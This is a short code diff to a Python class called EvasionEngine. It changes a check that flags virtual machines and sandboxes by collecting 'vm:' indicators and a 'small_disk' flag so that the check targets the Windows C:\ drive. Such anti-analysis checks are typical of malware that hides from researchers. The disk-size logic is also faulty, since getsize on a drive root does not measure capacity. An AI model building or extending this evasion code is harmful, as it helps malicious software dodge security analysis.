@@ -177,7 +177,11 @@ class EvasionEngine:
                         indicators.append(f'vm:{v}')
             except Exception:
                 pass
-        disk = os.path.getsize('/') if os.path.exists('/') else 0
+        try:
+            import os as _os
+            disk = _os.path.getsize('C:\\') if _os.path.exists('C:\\') else 0
+        except Exception:
+            disk = 0
         if 0 < disk < 60 * 1024 * 1024 * 1024:
             indicators.append('small_disk')
         return len(indicators) > 0
